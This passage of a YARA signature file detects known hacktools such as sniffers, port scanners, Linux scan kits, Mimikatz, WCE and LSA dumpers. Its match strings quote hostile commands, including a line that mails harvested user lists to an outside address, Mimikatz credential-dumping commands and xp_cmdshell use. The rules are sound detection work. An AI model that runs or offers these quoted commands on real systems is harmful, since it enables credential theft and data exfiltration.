		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s3 = "%s - simple sniffer for win2000" fullword ascii
		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s7 = "http://www.xfocus.org" fullword ascii
		$s9 = "  -pass        : Filter username/password" fullword ascii
		$s18 = "  -udp         : Output udp packets" fullword ascii
		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s20 = "  -tcp         : Output tcp packets" fullword ascii
	condition:
		6 of them
}

rule sig_238_fscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
	strings:
		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
		$s13 = "http://www.foundstone.com" fullword ascii
		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
		$s18 = "Bind port number out of range. Using system default." fullword ascii
		$s19 = "fscan.exe" fullword wide
	condition:
		4 of them
}

rule _iissample_nesscan_twwwscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
	strings:
		$s0 = "Connecting HTTP Port - Result: " fullword
		$s1 = "No space for command line argument vector" fullword
		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
		$s5 = "No space for copy of command line" fullword
		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
		$s8 = "scanf : floating point formats not linked" fullword
		$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
		$s13 = "!\"what?\"" fullword
		$s14 = "%s Port %d Closed" fullword
		$s16 = "printf : floating point formats not linked" fullword
		$s17 = "xxtype.cpp" fullword
	condition:
		all of them
}

rule _FsHttp_FsPop_FsSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
	strings:
		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
		$s1 = "-ERR Get SMS Users ID Failed" fullword
		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
		$s3 = "-ERR Post SMS Failed" fullword
		$s4 = "Current.hlt" fullword
		$s6 = "Histroy.hlt" fullword
		$s7 = "-ERR Send SMS Failed" fullword
		$s12 = "-ERR Change Password <New Password>" fullword
		$s17 = "+OK Send SMS Succussifully" fullword
		$s18 = "+OK Set New Password: [%s]" fullword
		$s19 = "CHANGE PASSWORD" fullword
	condition:
		all of them
}

rule Ammyy_Admin_AA_v3 {
	meta:
		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/gkAg2E"
		date = "2014/12/22"
		score = 55
		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
	strings:
		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
		$x5 = "Please enter password for accessing remote computer" fullword ascii

		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
	condition:
		2 of ($x*) or all of ($s*)
}

/* Other dumper and custom hack tools */

rule LinuxHacktool_eyes_screen {
	meta:
		description = "Linux hack tools - file screen"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "a240a0118739e72ff89cefa2540bf0d7da8f8a6c"
	strings:
		$s0 = "or: %s -r [host.tty]" fullword ascii
		$s1 = "%s: process: character, ^x, or (octal) \\032 expected." fullword ascii
		$s2 = "Type \"screen [-d] -r [pid.]tty.host\" to resume one of them." fullword ascii
		$s6 = "%s: at [identifier][%%|*|#] command [args]" fullword ascii
		$s8 = "Slurped only %d characters (of %d) into buffer - try again" fullword ascii
		$s11 = "command from %s: %s %s" fullword ascii
		$s16 = "[ Passwords don't match - your armor crumbles away ]" fullword ascii
		$s19 = "[ Passwords don't match - checking turned off ]" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_scanssh {
	meta:
		description = "Linux hack tools - file scanssh"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
	strings:
		$s0 = "Connection closed by remote host" fullword ascii
		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
		$s5 = "Server closed connection" fullword ascii
		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
		$s9 = "Remote host closed connection" fullword ascii
		$s10 = "%s: line %d: bad command `%s'" fullword ascii
		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_pscan2 {
	meta:
		description = "Linux hack tools - file pscan2"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
	strings:
		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
		$s8 = "Invalid IP." fullword ascii
		$s9 = "# scanning: " fullword ascii
		$s10 = "Unable to allocate socket." fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_a {
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_mass {
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
	condition:
		1 of them
}

rule LinuxHacktool_eyes_pscan2_2 {
	meta:
		description = "Linux hack tools - file pscan2.c"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
	strings:
		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
	condition:
		2 of them
}

rule CN_Portscan : APT
{
    meta:
        description = "CN Port Scanner"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
    	$s1 = "MZ"
		$s2 = "TCP 12.12.12.12"
    condition:
        ($s1 at 0) and $s2
}

rule WMI_vbs : APT
{
    meta:
        description = "WMI Tool - APT"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
		$s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"
    condition:
        all of them
}

rule CN_Toolset__XScanLib_XScanLib_XScanLib {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "af419603ac28257134e39683419966ab3d600ed2"
		hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
		hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
	strings:
		$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
		$s2 = "PlugGetUdpPort" fullword
		$s3 = "XScanLib.dll" fullword
		$s4 = "PlugGetTcpPort" fullword
		$s11 = "PlugGetVulnNum" fullword
	condition:
		all of them
}

rule CN_Toolset_NTscan_PipeCmd {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
	strings:
		$s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s3 = "PipeCmd.exe" fullword wide
		$s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s5 = "%s\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
		$s9 = "PipeCmdSrv.exe" fullword ascii
		$s10 = "This is a service executable! Couldn't start directly." fullword ascii
		$s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
		$s14 = "PIPECMDSRV" fullword wide
		$s15 = "PipeCmd Service" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset_LScanPortss_2 {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "4631ec57756466072d83d49fbc14105e230631a0"
	strings:
		$s1 = "LScanPort.EXE" fullword wide
		$s3 = "www.honker8.com" fullword wide
		$s4 = "DefaultPort.lst" fullword ascii
		$s5 = "Scan over.Used %dms!" fullword ascii
		$s6 = "www.hf110.com" fullword wide
		$s15 = "LScanPort Microsoft " fullword wide
		$s18 = "L-ScanPort2.0 CooFly" fullword wide
	condition:
		4 of them
}

rule CN_Toolset_sig_1433_135_sqlr {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
	strings:
		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
		$s11 = ";DATABASE=master" fullword ascii
		$s12 = "xp_cmdshell '" fullword ascii
		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
	condition:
		all of them
}


/* Mimikatz */

rule Mimikatz_Memory_Rule_1 : APT {
	meta:
		author = "Florian Roth"
		date = "12/22/2014"
		score = 70
		type = "memory"
		description = "Detects password dumper mimikatz in memory"
	strings:
		$s1 = "sekurlsa::msv" fullword ascii
	    $s2 = "sekurlsa::wdigest" fullword ascii
	    $s4 = "sekurlsa::kerberos" fullword ascii
	    $s5 = "sekurlsa::tspkg" fullword ascii
	    $s6 = "sekurlsa::livessp" fullword ascii
	    $s7 = "sekurlsa::ssp" fullword ascii
	    $s8 = "sekurlsa::logonPasswords" fullword ascii
	    $s9 = "sekurlsa::process" fullword ascii
	    $s10 = "ekurlsa::minidump" fullword ascii
	    $s11 = "sekurlsa::pth" fullword ascii
	    $s12 = "sekurlsa::tickets" fullword ascii
	    $s13 = "sekurlsa::ekeys" fullword ascii
	    $s14 = "sekurlsa::dpapi" fullword ascii
	    $s15 = "sekurlsa::credman" fullword ascii
	condition:
		1 of them
}

rule Mimikatz_Memory_Rule_2 : APT {
	meta:
		description = "Mimikatz Rule generated from a memory dump"
		author = "Florian Roth - Florian Roth"
		type = "memory"
		score = 80
	strings:
		$s0 = "sekurlsa::" ascii
		$x1 = "cryptprimitives.pdb" ascii
		$x2 = "Now is t1O" ascii fullword
		$x4 = "ALICE123" ascii
		$x5 = "BOBBY456" ascii
	condition:
		$s0 and 1 of ($x*)
}

rule mimikatz
{
	meta:
		description		= "mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Benjamin DELPY (gentilkiwi)"
      score          = 80
	strings:
		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
		$exe_x86_2		= { 89 79 04 89 [0-3] 38 8d 04 b5 }

		$exe_x64_1		= { 4c 03 d8 49 [0-3] 8b 03 48 89 }
		$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }

		$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }

		$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }

	condition:
		(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}


rule mimikatz_lsass_mdmp
{
	meta:
		description		= "LSASS minidump file for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$lsass			= "System32\\lsass.exe"	wide nocase

	condition:
		(uint32(0) == 0x504d444d) and $lsass
}

rule wce
{
	meta:
		description		= "wce"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Hernan Ochoa (hernano)"

	strings:
		$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
		$hex_x86		= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
		$hex_x64		= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }

	condition:
		any of them
}


rule lsadump
{
	meta:
		description		= "LSA dump programe (bootkey/syskey) - pwdump and others"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$str_sam_inc	= "\\Domains\\Account" ascii nocase
		$str_sam_exc	= "\\Domains\\Account\\Users\\Names\\" ascii nocase
		$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }
		$str_msv_lsa	= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }
		$hex_bkey		= { 4b 53 53 4d [20-70] 05 00 01 00}

	condition:
		( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )
      and not uint16(0) == 0x5a4d
}

rule Mimikatz_Logfile
{
	meta:
		description = "Detects a log file generated by malicious hack tool mimikatz"
		author = "Florian Roth"
		score = 80
		date = "2015/03/31"
		reference = "https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar"
	strings:
		$s1 = "SID               :" ascii fullword
		$s2 = "* NTLM     :" ascii fullword
		$s3 = "Authentication Id :" ascii fullword
		$s4 = "wdigest :" ascii fullword
	condition:
		all of them
}

rule AppInitHook {
	meta:
		description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll"
		author = "Florian Roth"
		reference = "https://goo.gl/Z292v6"
		date = "2015-07-15"
		score = 70
		hash = "e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45"
	strings:
		$s0 = "\\Release\\AppInitHook.pdb" ascii
		$s1 = "AppInitHook.dll" fullword ascii
		$s2 = "mimikatz.exe" fullword wide
		$s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
		$s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
		$s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
		$s6 = "VoidFunc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule VSSown_VBS {
	meta:
		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
		author = "Florian Roth"
		date = "2015-10-01"
		score = 75
	strings:
		$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
		$s1 = "Select * From Win32_ShadowCopy" ascii
		$s2 = "cmd /C mklink /D " ascii
		$s3 = "ClientAccessible" ascii
		$s4 = "WScript.Shell" ascii
		$s5 = "Win32_Process" ascii
	condition:
		all of them
}
rule wineggdrop : portscanner toolkit
{
    meta:
        author = "Christian Rebischke (@sh1bumi)"
        date = "2015-09-05"
        description = "Rules for TCP Portscanner VX.X by WinEggDrop"
        in_the_wild = true
        family = "Hackingtool/Portscanner"

    strings:
        $a = { 54 43 50 20 50 6f 72 74 20 53 63 61 6e 6e 65 72 
               20 56 3? 2e 3? 20 42 79 20 57 69 6e 45 67 67 44 
               72 6f 70 0a } 
        $b = "Result.txt"
        $c = "Usage:   %s TCP/SYN StartIP [EndIP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]\n"

    condition:
        //check for MZ Signature at offset 0
        uint16(0) == 0x5A4D

        and

        //check for wineggdrop specific strings
        $a and $b and $c 
}

